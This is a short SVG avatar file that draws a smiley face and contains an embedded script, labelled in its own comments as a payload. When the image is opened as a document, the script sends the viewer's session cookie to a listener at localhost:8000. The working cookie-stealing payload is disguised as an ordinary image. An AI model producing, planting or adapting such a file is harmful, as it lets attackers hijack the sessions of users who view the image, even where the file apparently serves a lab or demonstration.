<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120">
  <!-- visible drawing: a simple smiley so it looks like a normal avatar -->
  <circle cx="60" cy="60" r="55" fill="#FFD93D" stroke="#E6B800" stroke-width="3"/>
  <circle cx="42" cy="48" r="8" fill="#333"/>
  <circle cx="78" cy="48" r="8" fill="#333"/>
  <path d="M40 78 Q60 98 80 78" stroke="#333" stroke-width="5" fill="none" stroke-linecap="round"/>

  <!-- the payload still runs when the SVG is opened as a document -->
  <script>
    // steal the victim's session cookie -> attacker's listener
    new Image().src = "http://localhost:8000/steal?c=" + encodeURIComponent(document.cookie);
  </script>
</svg>
